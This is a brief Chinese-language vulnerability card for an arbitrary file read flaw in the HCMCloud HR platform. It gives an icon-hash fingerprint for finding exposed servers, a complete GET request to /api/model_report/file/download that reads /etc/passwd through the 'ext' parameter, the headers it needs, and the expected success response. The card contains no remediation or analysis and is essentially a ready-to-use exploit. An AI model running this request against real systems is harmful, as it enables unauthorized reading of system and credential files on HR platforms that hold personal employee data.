# HCMCloud-云端专业人力资源平台任意文件读取漏洞

- **系统**：HCMCloud　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`icon_hash="-859381597"`
- **请求**：`GET /api/model_report/file/download?index=/&ext=/etc/passwd HTTP/2`
- **关键头**：`Sec-Fetch-User: ?1`　`Priority: u=0, i`
- **预期**：200　|　root